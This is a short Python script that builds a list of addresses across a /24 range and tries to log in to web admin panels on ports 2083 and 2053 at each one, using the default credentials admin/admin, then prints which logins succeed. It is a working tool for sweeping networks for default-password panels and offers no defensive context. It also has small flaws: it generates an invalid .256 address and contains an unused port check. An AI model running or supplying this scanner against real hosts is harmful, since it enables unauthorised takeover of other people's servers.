import requests
import socket


def ip_list(iprange):
    my_file = open("ips.txt", "w")
    my_file.write("")
    my_file.close()
    x = 0
    my_file = open("ips.txt", "a+")
    while x != 257:
        my_file.write(f"{iprange}.{x}\n")
        x += 1

    my_file.close()


ip_list(input("input ip range(xxx.xxx.xxx) ==>"))


def checker83(ip: str):
    try:
        url = f"http://{ip}:2083/login"

        data = {'username': 'admin', 'password': 'admin'}

        x = requests.post(url, data, timeout=3)

        x = x.json()

        if (x["success"]) == True:
            return True, "--------------------------------------------------------------------"
        else: return True,f"-------------------------{x['msg']}-------------------------"
    except:
        return False
    
def checker53(ip: str):
    try:
        url = f"http://{ip}:2053/login"

        data = {'username': 'admin', 'password': 'admin'}

        x = requests.post(url, data, timeout=3)

        x = x.json()

        if (x["success"]) == True:
            return f"********************************{True}******************************"
        else: return True,f"-------------------------{x['msg']}-------------------------"
    except:
        return False

def nmap(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip, 80))
    if result == 0:
        return ip, True
    else:
        return ip, False
    sock.close()


x = 0

for i in range(1):
    ips = open("ips.txt", "r").readlines()
    for ip in ips:
        ip = ip.strip()
        print(f"\n{ip}: ")
        print("2083:",checker83(ip))
        print("2053:",checker53(ip))
        x += 1


input("prees inter to close")
